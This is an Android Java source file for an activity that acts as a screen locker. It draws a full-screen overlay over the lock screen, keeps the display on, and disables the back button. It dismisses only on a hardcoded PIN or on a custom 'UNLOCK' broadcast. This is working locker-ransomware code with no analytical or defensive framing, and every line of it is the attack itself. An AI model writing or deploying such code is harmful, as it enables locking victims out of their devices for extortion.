package com.pegasus.void;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

public class OverlayActivity extends Activity {

    private EditText pinInput;
    private Button unlockButton;
    private BroadcastReceiver unlockReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.overlay_lock);

        getWindow().setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN | 
                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                            WindowManager.LayoutParams.FLAG_FULLSCREEN | 
                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);

        pinInput = findViewById(R.id.pinInput);
        unlockButton = findViewById(R.id.unlockButton);

        unlockButton.setOnClickListener(v -> {
            String pin = pinInput.getText().toString();
            if (pin.equals("969")) {
                finish();
            } else {
                Toast.makeText(this, "Wrong PIN", Toast.LENGTH_SHORT).show();
                pinInput.setText("");
            }
        });

        unlockReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                finish();
            }
        };

        registerReceiver(unlockReceiver, new IntentFilter("com.pegasus.void.UNLOCK"));
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (unlockReceiver != null) {
            unregisterReceiver(unlockReceiver);
        }
    }

    @Override
    public void onBackPressed() {
        // Disable back button
    }
}
